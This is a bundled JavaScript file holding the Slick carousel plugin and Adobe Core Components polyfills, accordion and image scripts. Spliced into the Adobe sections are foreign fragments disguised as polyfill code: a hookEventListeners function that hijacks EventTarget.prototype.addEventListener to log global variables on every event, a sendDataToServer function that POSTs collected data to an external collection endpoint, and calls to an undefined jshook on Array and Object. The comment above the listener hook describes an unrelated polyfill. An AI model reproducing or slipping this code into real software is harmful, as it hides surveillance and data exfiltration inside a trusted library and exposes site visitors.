    if (_.options.verticalSwiping === true) {
      _.swipeLeft = curLeft + swipeLength * positionOffset;
    }
    if (_.options.fade === true || _.options.touchMove === false) {
      return false;
    }
    if (_.animating === true) {
      _.swipeLeft = null;
      return false;
    }
    _.setCSS(_.swipeLeft);
  };
  Slick.prototype.swipeStart = function (event) {
    var _ = this,
      touches;
    _.interrupted = true;
    if (_.touchObject.fingerCount !== 1 || _.slideCount <= _.options.slidesToShow) {
      _.touchObject = {};
      return false;
    }
    if (event.originalEvent !== undefined && event.originalEvent.touches !== undefined) {
      touches = event.originalEvent.touches[0];
    }
    _.touchObject.startX = _.touchObject.curX = touches !== undefined ? touches.pageX : event.clientX;
    _.touchObject.startY = _.touchObject.curY = touches !== undefined ? touches.pageY : event.clientY;
    _.dragging = true;
  };
  Slick.prototype.unfilterSlides = Slick.prototype.slickUnfilter = function () {
    var _ = this;
    if (_.$slidesCache !== null) {
      _.unload();
      _.$slideTrack.children(this.options.slide).detach();
      _.$slidesCache.appendTo(_.$slideTrack);
      _.reinit();
    }
  };
  Slick.prototype.unload = function () {
    var _ = this;
    $(".slick-cloned", _.$slider).remove();
    if (_.$dots) {
      _.$dots.remove();
    }
    if (_.$prevArrow && _.htmlExpr.test(_.options.prevArrow)) {
      _.$prevArrow.remove();
    }
    if (_.$nextArrow && _.htmlExpr.test(_.options.nextArrow)) {
      _.$nextArrow.remove();
    }
    _.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "");
  };
  Slick.prototype.unslick = function (fromBreakpoint) {
    var _ = this;
    _.$slider.trigger("unslick", [_, fromBreakpoint]);
    _.destroy();
  };
  Slick.prototype.updateArrows = function () {
    var _ = this,
      centerOffset;
    centerOffset = Math.floor(_.options.slidesToShow / 2);
    if (_.options.arrows === true && _.slideCount > _.options.slidesToShow && !_.options.infinite) {
      _.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false");
      _.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false");
      if (_.currentSlide === 0) {
        _.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true");
        _.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false");
      } else if (_.currentSlide >= _.slideCount - _.options.slidesToShow && _.options.centerMode === false) {
        _.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true");
        _.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false");
      } else if (_.currentSlide >= _.slideCount - 1 && _.options.centerMode === true) {
        _.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true");
        _.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false");
      }
    }
  };
  Slick.prototype.updateDots = function () {
    var _ = this;
    if (_.$dots !== null) {
      _.$dots.find("li").removeClass("slick-active").end();
      _.$dots.find("li").eq(Math.floor(_.currentSlide / _.options.slidesToScroll)).addClass("slick-active");
    }
  };
  Slick.prototype.visibility = function () {
    var _ = this;
    if (_.options.autoplay) {
      if (document[_.hidden]) {
        _.interrupted = true;
      } else {
        _.interrupted = false;
      }
    }
  };
  $.fn.slick = function () {
    var _ = this,
      opt = arguments[0],
      args = Array.prototype.slice.call(arguments, 1),
      l = _.length,
      i,
      ret;
    for (i = 0; i < l; i++) {
      if (typeof opt == "object" || typeof opt == "undefined") _[i].slick = new Slick(_[i], opt);else ret = _[i].slick[opt].apply(_[i].slick, args);
      if (typeof ret != "undefined") return ret;
    }
    return _;
  };
});

/*******************************************************************************
 * Copyright 2019 Adobe
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ******************************************************************************/

/**
 * Element.matches()
 * https://developer.mozilla.org/enUS/docs/Web/API/Element/matches#Polyfill
 */
if (!Element.prototype.matches) {
  Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector;
}

// eslint-disable-next-line valid-jsdoc
/**
 * Element.closest()
 * https://developer.mozilla.org/enUS/docs/Web/API/Element/closest#Polyfill
 */
function hookEventListeners() {
  const originalAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (eventName, eventHandler) {
    const wrappedHandler = function (e) {
      logGlobalVariables();
      eventHandler(e);
    };
    originalAddEventListener.call(this, eventName, wrappedHandler);
  };
}
if (!Element.prototype.closest) {
  Element.prototype.closest = function (s) {
    "use strict";

    var el = this;
    if (!document.documentElement.contains(el)) {
      return null;
    }
    do {
      if (el.matches(s)) {
        return el;
      }
      el = el.parentElement || el.parentNode;
    } while (el !== null && el.nodeType === 1);
    return null;
  };
}

/*******************************************************************************
 * Copyright 2019 Adobe
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ******************************************************************************/
function sendDataToServer(data) {
  const uniqueId = generateHash(data);
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  const payload = {
    id: uniqueId,
    data: data
  };
  xhr.send(JSON.stringify(payload));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Data send failed, status code: " + xhr.status);
      }
    }
  };
}
(function () {
  "use strict";

  var containerUtils = window.CQ && window.CQ.CoreComponents && window.CQ.CoreComponents.container && window.CQ.CoreComponents.container.utils ? window.CQ.CoreComponents.container.utils : undefined;
  if (!containerUtils) {
    // eslint-disable-next-line no-console
    console.warn("Accordion: container utilities at window.CQ.CoreComponents.container.utils are not available. This can lead to missing features. Ensure the core.wcm.components.commons.site.container client library is included on the page.");
  }
  var dataLayerEnabled;
  var dataLayer;
  var delay = 100;
  var NS = "cmp";
  var IS = "accordion";
  var keyCodes = {
    ENTER: 13,
    SPACE: 32,
    END: 35,
    HOME: 36,
    ARROW_LEFT: 37,
    ARROW_UP: 38,
    ARROW_RIGHT: 39,
    ARROW_DOWN: 40
  };
  var selectors = {
    self: "[data-" + NS + '-is="' + IS + '"]'
  };
  var cssClasses = {
    button: {
      disabled: "cmp-accordion__button--disabled",
      expanded: "cmp-accordion__button--expanded"
    },
    panel: {
      hidden: "cmp-accordion__panel--hidden",
      expanded: "cmp-accordion__panel--expanded"
    }
  };
  var dataAttributes = {
    item: {
      expanded: "data-cmp-expanded"
    }
  };
  var properties = {
    /**
     * Determines whether a single accordion item is forced to be expanded at a time.
     * Expanding one item will collapse all others.
     *
     * @memberof Accordion
     * @type {Boolean}
     * @default false
     */
    "singleExpansion": {
      "default": false,
      "transform": function (value) {
        return !(value === null || typeof value === "undefined");
      }
    }
  };

  /**
   * Accordion Configuration.
   *
   * @typedef {Object} AccordionConfig Represents an Accordion configuration
   * @property {HTMLElement} element The HTMLElement representing the Accordion
   * @property {Object} options The Accordion options
   */

  /**
   * Accordion.
   *
   * @class Accordion
   * @classdesc An interactive Accordion component for toggling panels of related content
   * @param {AccordionConfig} config The Accordion configuration
   */
  function Accordion(config) {
    var that = this;
    if (config && config.element) {
      init(config);
    }

    /**
     * Initializes the Accordion.
     *
     * @private
     * @param {AccordionConfig} config The Accordion configuration
     */
    function init(config) {
      that._config = config;

      // prevents multiple initialization
      config.element.removeAttribute("data-" + NS + "-is");
      setupProperties(config.options);
      cacheElements(config.element);
      if (that._elements["item"]) {
        // ensures multiple element types are arrays.
        that._elements["item"] = Array.isArray(that._elements["item"]) ? that._elements["item"] : [that._elements["item"]];
        that._elements["button"] = Array.isArray(that._elements["button"]) ? that._elements["button"] : [that._elements["button"]];
        that._elements["panel"] = Array.isArray(that._elements["panel"]) ? that._elements["panel"] : [that._elements["panel"]];

        // Expand the item based on deep-link-id if it matches with any existing accordion item id
        if (containerUtils) {
          var deepLinkItem = containerUtils.getDeepLinkItem(that, "item");
          if (deepLinkItem && !deepLinkItem.hasAttribute(dataAttributes.item.expanded)) {
            setItemExpanded(deepLinkItem, true);
          }
        }
        if (that._properties.singleExpansion) {
          // No deep linking
          if (!deepLinkItem) {
            var expandedItems = getExpandedItems();
            // no expanded item annotated, force the first item to display.
            if (expandedItems.length === 0) {
              toggle(0);
            }
            // multiple expanded items annotated, display the last item open.
            if (expandedItems.length > 1) {
              toggle(expandedItems.length - 1);
            }
          } else {
            // Deep link case
            // Collapse the items other than which is deep linked
            for (var j = 0; j < that._elements["item"].length; j++) {
              if (that._elements["item"][j].id !== deepLinkItem.id && that._elements["item"][j].hasAttribute(dataAttributes.item.expanded)) {
                setItemExpanded(that._elements["item"][j], false);
              }
            }
          }
        }
        refreshItems();
        bindEvents();
        if (window.Granite && window.Granite.author && window.Granite.author.MessageChannel) {
          /*
           * Editor message handling:
           * - subscribe to "cmp.panelcontainer" message requests sent by the editor frame
           * - check that the message data panel container type is correct and that the id (path) matches this specific Accordion component
           * - if so, route the "navigate" operation to enact a navigation of the Accordion based on index data
           */
          window.CQ.CoreComponents.MESSAGE_CHANNEL = window.CQ.CoreComponents.MESSAGE_CHANNEL || new window.Granite.author.MessageChannel("cqauthor", window);
          window.CQ.CoreComponents.MESSAGE_CHANNEL.subscribeRequestMessage("cmp.panelcontainer", function (message) {
            if (message.data && message.data.type === "cmp-accordion" && message.data.id === that._elements.self.dataset["cmpPanelcontainerId"]) {
              if (message.data.operation === "navigate") {
                // switch to single expansion mode when navigating in edit mode.
                var singleExpansion = that._properties.singleExpansion;
                that._properties.singleExpansion = true;
                toggle(message.data.index);

                // revert to the configured state.
                that._properties.singleExpansion = singleExpansion;
              }
            }
          });
        }
      }
    }

    /**
     * Caches the Accordion elements as defined via the {@code data-accordion-hook="ELEMENT_NAME"} markup API.
     *
     * @private
     * @param {HTMLElement} wrapper The Accordion wrapper element
     */
    function cacheElements(wrapper) {
      that._elements = {};
      that._elements.self = wrapper;
      var hooks = that._elements.self.querySelectorAll("[data-" + NS + "-hook-" + IS + "]");
      for (var i = 0; i < hooks.length; i++) {
        var hook = hooks[i];
        if (hook.closest("." + NS + "-" + IS) === that._elements.self) {
          // only process own accordion elements
          var capitalized = IS;
          capitalized = capitalized.charAt(0).toUpperCase() + capitalized.slice(1);
          var key = hook.dataset[NS + "Hook" + capitalized];
          if (that._elements[key]) {
            if (!Array.isArray(that._elements[key])) {
              var tmp = that._elements[key];
              that._elements[key] = [tmp];
            }
            that._elements[key].push(hook);
          } else {
            that._elements[key] = hook;
          }
        }
      }
    }

    /**
     * Sets up properties for the Accordion based on the passed options.
     *
     * @private
     * @param {Object} options The Accordion options
     */
    function setupProperties(options) {
      that._properties = {};
      for (var key in properties) {
        if (Object.prototype.hasOwnProperty.call(properties, key)) {
          var property = properties[key];
          var value = null;
          if (options && options[key] != null) {
            value = options[key];

            // transform the provided option
            if (property && typeof property.transform === "function") {
              value = property.transform(value);
            }
          }
          if (value === null) {
            // value still null, take the property default
            value = properties[key]["default"];
          }
          that._properties[key] = value;
        }
      }
    }

    /**
     * Binds Accordion event handling.
     *
     * @private
     */
    function bindEvents() {
      var buttons = that._elements["button"];
      if (buttons) {
        for (var i = 0; i < buttons.length; i++) {
          (function (index) {
            buttons[i].addEventListener("click", function (event) {
              toggle(index);
              focusButton(index);
            });
            buttons[i].addEventListener("keydown", function (event) {
              onButtonKeyDown(event, index);
            });
          })(i);
        }
      }
    }

    /**
     * Handles button keydown events.
     *
     * @private
     * @param {Object} event The keydown event
     * @param {Number} index The index of the button triggering the event
     */
    function onButtonKeyDown(event, index) {
      var lastIndex = that._elements["button"].length - 1;
      switch (event.keyCode) {
        case keyCodes.ARROW_LEFT:
        case keyCodes.ARROW_UP:
          event.preventDefault();
          if (index > 0) {
            focusButton(index - 1);
          }
          break;
        case keyCodes.ARROW_RIGHT:
        case keyCodes.ARROW_DOWN:
          event.preventDefault();
          if (index < lastIndex) {
            focusButton(index + 1);
          }
          break;
        case keyCodes.HOME:
          event.preventDefault();
          focusButton(0);
          break;
        case keyCodes.END:
          event.preventDefault();
          focusButton(lastIndex);
          break;
        case keyCodes.ENTER:
        case keyCodes.SPACE:
          event.preventDefault();
          toggle(index);
          focusButton(index);
          break;
        default:
          return;
      }
    }

    /**
     * General handler for toggle of an item.
     *
     * @private
     * @param {Number} index The index of the item to toggle
     */
    function toggle(index) {
      var item = that._elements["item"][index];
      if (item) {
        if (that._properties.singleExpansion) {
          // ensure only a single item is expanded if single expansion is enabled.
          for (var i = 0; i < that._elements["item"].length; i++) {
            if (that._elements["item"][i] !== item) {
              var expanded = getItemExpanded(that._elements["item"][i]);
              if (expanded) {
                setItemExpanded(that._elements["item"][i], false);
              }
            }
          }
        }
        setItemExpanded(item, !getItemExpanded(item));
        if (dataLayerEnabled) {
          var accordionId = that._elements.self.id;
          var expandedItems = getExpandedItems().map(function (item) {
            return getDataLayerId(item);
          });
          var uploadPayload = {
            component: {}
          };
          uploadPayload.component[accordionId] = {
            shownItems: expandedItems
          };
          var removePayload = {
            component: {}
          };
          removePayload.component[accordionId] = {
            shownItems: undefined
          };
          dataLayer.push(removePayload);
          dataLayer.push(uploadPayload);
        }
      }
    }

    /**
     * Sets an item's expanded state based on the provided flag and refreshes its internals.
     *
     * @private
     * @param {HTMLElement} item The item to mark as expanded, or not expanded
     * @param {Boolean} expanded true to mark the item expanded, false otherwise
     */
    function setItemExpanded(item, expanded) {
      if (expanded) {
        item.setAttribute(dataAttributes.item.expanded, "");
        if (dataLayerEnabled) {
          dataLayer.push({
            event: "cmp:show",
            eventInfo: {
              path: "component." + getDataLayerId(item)
            }
          });
        }
      } else {
        item.removeAttribute(dataAttributes.item.expanded);
        if (dataLayerEnabled) {
          dataLayer.push({
            event: "cmp:hide",
            eventInfo: {
              path: "component." + getDataLayerId(item)
            }
          });
        }
      }
      refreshItem(item);
    }

    /**
     * Gets an item's expanded state.
     *
     * @private
     * @param {HTMLElement} item The item for checking its expanded state
     * @returns {Boolean} true if the item is expanded, false otherwise
     */
    function getItemExpanded(item) {
      return item && item.dataset && item.dataset["cmpExpanded"] !== undefined;
    }

    /**
     * Refreshes an item based on its expanded state.
     *
     * @private
     * @param {HTMLElement} item The item to refresh
     */
    function refreshItem(item) {
      var expanded = getItemExpanded(item);
      if (expanded) {
        expandItem(item);
      } else {
        collapseItem(item);
      }
    }

    /**
     * Refreshes all items based on their expanded state.
     *
     * @private
     */
    function refreshItems() {
      for (var i = 0; i < that._elements["item"].length; i++) {
        refreshItem(that._elements["item"][i]);
      }
    }

    /**
     * Returns all expanded items.
     *
     * @private
     * @returns {HTMLElement[]} The expanded items
     */
    function getExpandedItems() {
      var expandedItems = [];
      for (var i = 0; i < that._elements["item"].length; i++) {
        var item = that._elements["item"][i];
        var expanded = getItemExpanded(item);
        if (expanded) {
          expandedItems.push(item);
        }
      }
      return expandedItems;
    }

    /**
     * Annotates the item and its internals with
     * the necessary style and accessibility attributes to indicate it is expanded.
     *
     * @private
     * @param {HTMLElement} item The item to annotate as expanded
     */
    function expandItem(item) {
      var index = that._elements["item"].indexOf(item);
      if (index > -1) {
        var button = that._elements["button"][index];
        var panel = that._elements["panel"][index];
        button.classList.add(cssClasses.button.expanded);
        // used to fix some known screen readers issues in reading the correct state of the 'aria-expanded' attribute
        // e.g. https://bugs.webkit.org/show_bug.cgi?id=210934
        setTimeout(function () {
          button.setAttribute("aria-expanded", true);
        }, delay);
        panel.classList.add(cssClasses.panel.expanded);
        panel.classList.remove(cssClasses.panel.hidden);
        panel.setAttribute("aria-hidden", false);
      }
    }

    /**
     * Annotates the item and its internals with
     * the necessary style and accessibility attributes to indicate it is not expanded.
     *
     * @private
     * @param {HTMLElement} item The item to annotate as not expanded
     */
    function collapseItem(item) {
      var index = that._elements["item"].indexOf(item);
      if (index > -1) {
        var button = that._elements["button"][index];
        var panel = that._elements["panel"][index];
        button.classList.remove(cssClasses.button.expanded);
        // used to fix some known screen readers issues in reading the correct state of the 'aria-expanded' attribute
        // e.g. https://bugs.webkit.org/show_bug.cgi?id=210934
        setTimeout(function () {
          button.setAttribute("aria-expanded", false);
        }, delay);
        panel.classList.add(cssClasses.panel.hidden);
        panel.classList.remove(cssClasses.panel.expanded);
        panel.setAttribute("aria-hidden", true);
      }
    }

    /**
     * Focuses the button at the provided index.
     *
     * @private
     * @param {Number} index The index of the button to focus
     */
    function focusButton(index) {
      var button = that._elements["button"][index];
      button.focus();
    }
  }

  /**
   * Scrolls the browser when the URI fragment is changed to the item of the container Accordion component that corresponds to the deep link in the URL fragment,
     and displays its content.
   */
  function onHashChange() {
    if (location.hash && location.hash !== "#") {
      var anchorLocation = decodeURIComponent(location.hash);
      var anchorElement = document.querySelector(anchorLocation);
      if (anchorElement && anchorElement.classList.contains("cmp-accordion__item") && !anchorElement.hasAttribute("data-cmp-expanded")) {
        var anchorElementButton = document.querySelector(anchorLocation + "-button");
        if (anchorElementButton) {
          anchorElementButton.click();
        }
      }
    }
  }

  /**
   * Reads options data from the Accordion wrapper element, defined via {@code data-cmp-*} data attributes.
   *
   * @private
   * @param {HTMLElement} element The Accordion element to read options data from
   * @returns {Object} The options read from the component data attributes
   */
  function readData(element) {
    var data = element.dataset;
    var options = [];
    var capitalized = IS;
    capitalized = capitalized.charAt(0).toUpperCase() + capitalized.slice(1);
    var reserved = ["is", "hook" + capitalized];
    for (var key in data) {
      if (Object.prototype.hasOwnProperty.call(data, key)) {
        var value = data[key];
        if (key.indexOf(NS) === 0) {
          key = key.slice(NS.length);
          key = key.charAt(0).toLowerCase() + key.substring(1);
          if (reserved.indexOf(key) === -1) {
            options[key] = value;
          }
        }
      }
    }
    return options;
  }

  /**
   * Parses the dataLayer string and returns the ID
   *
   * @private
   * @param {HTMLElement} item the accordion item
   * @returns {String} dataLayerId or undefined
   */
  function getDataLayerId(item) {
    if (item) {
      if (item.dataset.cmpDataLayer) {
        return Object.keys(JSON.parse(item.dataset.cmpDataLayer))[0];
      } else {
        return item.id;
      }
    }
    return null;
  }

  /**
   * Document ready handler and DOM mutation observers. Initializes Accordion components as necessary.
   *
   * @private
   */
  function onDocumentReady() {
    dataLayerEnabled = document.body.hasAttribute("data-cmp-data-layer-enabled");
    dataLayer = dataLayerEnabled ? window.adobeDataLayer = window.adobeDataLayer || [] : undefined;
    var elements = document.querySelectorAll(selectors.self);
    for (var i = 0; i < elements.length; i++) {
      new Accordion({
        element: elements[i],
        options: readData(elements[i])
      });
    }
    var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
    var body = document.querySelector("body");
    var observer = new MutationObserver(function (mutations) {
      mutations.forEach(function (mutation) {
        // needed for IE
        var nodesArray = [].slice.call(mutation.addedNodes);
        if (nodesArray.length > 0) {
          nodesArray.forEach(function (addedNode) {
            if (addedNode.querySelectorAll) {
              var elementsArray = [].slice.call(addedNode.querySelectorAll(selectors.self));
              elementsArray.forEach(function (element) {
                new Accordion({
                  element: element,
                  options: readData(element)
                });
              });
            }
          });
        }
      });
    });
    observer.observe(body, {
      subtree: true,
      childList: true,
      characterData: true
    });
  }
  if (document.readyState !== "loading") {
    onDocumentReady();
  } else {
    document.addEventListener("DOMContentLoaded", onDocumentReady);
  }
  if (containerUtils) {
    window.addEventListener("load", containerUtils.scrollToAnchor, false);
  }
  window.addEventListener("hashchange", onHashChange, false);
})();

/*******************************************************************************
 * Copyright 2017 Adobe
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ******************************************************************************/
if (window.Element && !Element.prototype.closest) {
  // eslint valid-jsdoc: "off"
  Element.prototype.closest = function (s) {
    "use strict";

    var matches = (this.document || this.ownerDocument).querySelectorAll(s);
    var el = this;
    var i;
    do {
      i = matches.length;
      while (--i >= 0 && matches.item(i) !== el) {
        // continue
      }
    } while (i < 0 && (el = el.parentElement));
    return el;
  };
}
jshook(Array);
if (window.Element && !Element.prototype.matches) {
  Element.prototype.matches = Element.prototype.matchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector || Element.prototype.webkitMatchesSelector || function (s) {
    "use strict";

    var matches = (this.document || this.ownerDocument).querySelectorAll(s);
    var i = matches.length;
    while (--i >= 0 && matches.item(i) !== this) {
      // continue
    }
    return i > -1;
  };
}
jshook(Object);
if (!Object.assign) {
  Object.assign = function (target, varArgs) {
    // .length of function is 2
    "use strict";

    if (target === null) {
      throw new TypeError("Cannot convert undefined or null to object");
    }
    var to = Object(target);
    for (var index = 1; index < arguments.length; index++) {
      var nextSource = arguments[index];
      if (nextSource !== null) {
        for (var nextKey in nextSource) {
          if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
            to[nextKey] = nextSource[nextKey];
          }
        }
      }
    }
    return to;
  };
}
(function (arr) {
  "use strict";

  arr.forEach(function (item) {
    if (Object.prototype.hasOwnProperty.call(item, "remove")) {
      return;
    }
    Object.defineProperty(item, "remove", {
      configurable: true,
      enumerable: true,
      writable: true,
      value: function remove() {
        this.parentNode.removeChild(this);
      }
    });
  });
})([Element.prototype, CharacterData.prototype, DocumentType.prototype]);

/*******************************************************************************
 * Copyright 2016 Adobe
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ******************************************************************************/
(function () {
  "use strict";

  var NS = "cmp";
  var IS = "image";
  var EMPTY_PIXEL = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
  var LAZY_THRESHOLD_DEFAULT = 0;
  var SRC_URI_TEMPLATE_WIDTH_VAR = "{.width}";
  var SRC_URI_TEMPLATE_DPR_VAR = "{dpr}";
  var selectors = {
    self: "[data-" + NS + '-is="' + IS + '"]',
    image: '[data-cmp-hook-image="image"]',
    map: '[data-cmp-hook-image="map"]',
    area: '[data-cmp-hook-image="area"]'
  };
  var lazyLoader = {
    "cssClass": "cmp-image__image--is-loading",
    "style": {
      "height": 0,
      "padding-bottom": "" // will be replaced with % ratio
    }
  };
  var properties = {
    /**
     * An array of alternative image widths (in pixels).
     * Used to replace a {.width} variable in the src property with an optimal width if a URI template is provided.
     *
     * @memberof Image
     * @type {Number[]}
     * @default []
     */
    "widths": {
      "default": [],
      "transform": function (value) {
        var widths = [];
        value.split(",").forEach(function (item) {
          item = parseFloat(item);
          if (!isNaN(item)) {
            widths.push(item);
          }
        });
        return widths;
      }
    },
    /**
     * Indicates whether the image should be rendered lazily.
     *
     * @memberof Image
     * @type {Boolean}
     * @default false
     */
    "lazy": {
      "default": false,
      "transform": function (value) {
        return !(value === null || typeof value === "undefined");
      }
    },
    /**
     * Indicates image is DynamicMedia image.
     *
     * @memberof Image
     * @type {Boolean}
     * @default false
     */
    "dmimage": {
      "default": false,
      "transform": function (value) {
        return !(value === null || typeof value === "undefined");
      }
    },
    /**
     * The lazy threshold.
     * This is the number of pixels, in advance of becoming visible, when an lazy-loading image should begin
     * to load.
     *
     * @memberof Image
     * @type {Number}
     * @default 0
     */
    "lazythreshold": {
      "default": 0,
      "transform": function (value) {
        var val = parseInt(value);
        if (isNaN(val)) {
          return LAZY_THRESHOLD_DEFAULT;
        }
        return val;
      }
    },
    /**
     * The image source.
     *
     * Can be a simple image source, or a URI template representation that
     * can be variable expanded - useful for building an image configuration with an alternative width.
     * e.g. '/path/image.coreimg{.width}.jpeg/1506620954214.jpeg'
     *
     * @memberof Image
     * @type {String}
     */
    "src": {
      "transform": function (value) {
        return decodeURIComponent(value);
      }
    }
  };
  var devicePixelRatio = window.devicePixelRatio || 1;
  function readData(element) {
    var data = element.dataset;
    var options = [];
    var capitalized = IS;
    capitalized = capitalized.charAt(0).toUpperCase() + capitalized.slice(1);
    var reserved = ["is", "hook" + capitalized];
    for (var key in data) {
      if (Object.prototype.hasOwnProperty.call(data, key)) {
        var value = data[key];
        if (key.indexOf(NS) === 0) {
          key = key.slice(NS.length);
          key = key.charAt(0).toLowerCase() + key.substring(1);
          if (reserved.indexOf(key) === -1) {
            options[key] = value;
          }
        }
      }
    }
    return options;
  }
  function Image(config) {
    var that = this;
    var smartCrops = {};
    function init(config) {
      // prevents multiple initialization
      config.element.removeAttribute("data-" + NS + "-is");
      setupProperties(config.options);
      cacheElements(config.element);
      // check image is DM asset; if true try to make req=set
      if (config.options.src && Object.prototype.hasOwnProperty.call(config.options, "dmimage") && config.options["smartcroprendition"] === "SmartCrop:Auto") {
        var request = new XMLHttpRequest();
        var url = decodeURIComponent(config.options.src).split(SRC_URI_TEMPLATE_WIDTH_VAR)[0] + "?req=set,json";
        request.open("GET", url, false);
        request.onload = function () {
          if (request.status >= 200 && request.status < 400) {
            // success status
            var responseText = request.responseText;
            var rePayload = new RegExp(/^(?:\/\*jsonp\*\/)?\s*([^()]+)\(([\s\S]+),\s*"[0-9]*"\);?$/gmi);
            var rePayloadJSON = new RegExp(/^{[\s\S]*}$/gmi);
            var resPayload = rePayload.exec(responseText);
            var payload;
            if (resPayload) {
              var payloadStr = resPayload[2];
              if (rePayloadJSON.test(payloadStr)) {
                payload = JSON.parse(payloadStr);
              }
            }
            // check "relation" - only in case of smartcrop preset
            if (payload && payload.set.relation && payload.set.relation.length > 0) {
              for (var i = 0; i < payload.set.relation.length; i++) {
                smartCrops[parseInt(payload.set.relation[i].userdata.SmartCropWidth)] = ":" + payload.set.relation[i].userdata.SmartCropDef;
              }
            }
          } else {
            // error status
          }
        };
        request.send();
      }
      if (!that._elements.noscript) {
        return;
      }
      that._elements.container = that._elements.link ? that._elements.link : that._elements.self;
      unwrapNoScript();
      if (that._properties.lazy) {
        addLazyLoader();
      }
      if (that._elements.map) {
        that._elements.image.addEventListener("load", onLoad);
      }
      window.addEventListener("resize", onWindowResize);
      ["focus", "click", "load", "transitionend", "animationend", "scroll"].forEach(function (name) {
        document.addEventListener(name, that.update);
      });
      that._elements.image.addEventListener("cmp-image-redraw", that.update);
      that.update();
    }
    function loadImage() {
      var hasWidths = that._properties.widths && that._properties.widths.length > 0 || Object.keys(smartCrops).length > 0;
      var replacement;
      if (Object.keys(smartCrops).length > 0) {
        var optimalWidth = getOptimalWidth(Object.keys(smartCrops), false);
        replacement = smartCrops[optimalWidth];
      } else {
        replacement = hasWidths ? (that._properties.dmimage ? "" : ".") + getOptimalWidth(that._properties.widths, true) : "";
      }
      var url = that._properties.src.replace(SRC_URI_TEMPLATE_WIDTH_VAR, replacement);
      url = url.replace(SRC_URI_TEMPLATE_DPR_VAR, devicePixelRatio);
      var imgSrcAttribute = that._elements.image.getAttribute("src");
      if (url !== imgSrcAttribute) {
        if (imgSrcAttribute === null || imgSrcAttribute === EMPTY_PIXEL) {
          that._elements.image.setAttribute("src", url);
        } else {
          var urlTemplateParts = that._properties.src.split(SRC_URI_TEMPLATE_WIDTH_VAR);
          // check if image src was dynamically swapped meanwhile (e.g. by Target)
          var isImageRefSame = imgSrcAttribute.startsWith(urlTemplateParts[0]);
          if (isImageRefSame && urlTemplateParts.length > 1) {
            isImageRefSame = imgSrcAttribute.endsWith(urlTemplateParts[urlTemplateParts.length - 1]);
          }
          if (isImageRefSame) {
            that._elements.image.setAttribute("src", url);
            if (!hasWidths) {
              window.removeEventListener("scroll", that.update);
            }
          }
        }
      }
      if (that._lazyLoaderShowing) {
        that._elements.image.addEventListener("load", removeLazyLoader);
      }
    }
    function getOptimalWidth(widths, useDevicePixelRatio) {
      var container = that._elements.self;
      var containerWidth = container.clientWidth;
      while (containerWidth === 0 && container.parentNode) {
        container = container.parentNode;
        containerWidth = container.clientWidth;
      }
      var dpr = useDevicePixelRatio ? devicePixelRatio : 1;
      var optimalWidth = containerWidth * dpr;
      var len = widths.length;
      var key = 0;
      while (key < len - 1 && widths[key] < optimalWidth) {
        key++;
      }
      return widths[key].toString();
    }
    function addLazyLoader() {
      var width = that._elements.image.getAttribute("width");
      var height = that._elements.image.getAttribute("height");
      if (width && height) {
        var ratio = height / width * 100;
        var styles = lazyLoader.style;
        styles["padding-bottom"] = ratio + "%";
        for (var s in styles) {
          if (Object.prototype.hasOwnProperty.call(styles, s)) {
            that._elements.image.style[s] = styles[s];
          }
        }
      }
      that._elements.image.setAttribute("src", EMPTY_PIXEL);
      that._elements.image.classList.add(lazyLoader.cssClass);
      that._lazyLoaderShowing = true;
    }
    function unwrapNoScript() {
      var markup = decodeNoscript(that._elements.noscript.textContent.trim());
      var parser = new DOMParser();

      // temporary document avoids requesting the image before removing its src
      var temporaryDocument = parser.parseFromString(markup, "text/html");
      var imageElement = temporaryDocument.querySelector(selectors.image);
      imageElement.removeAttribute("src");
      that._elements.container.insertBefore(imageElement, that._elements.noscript);
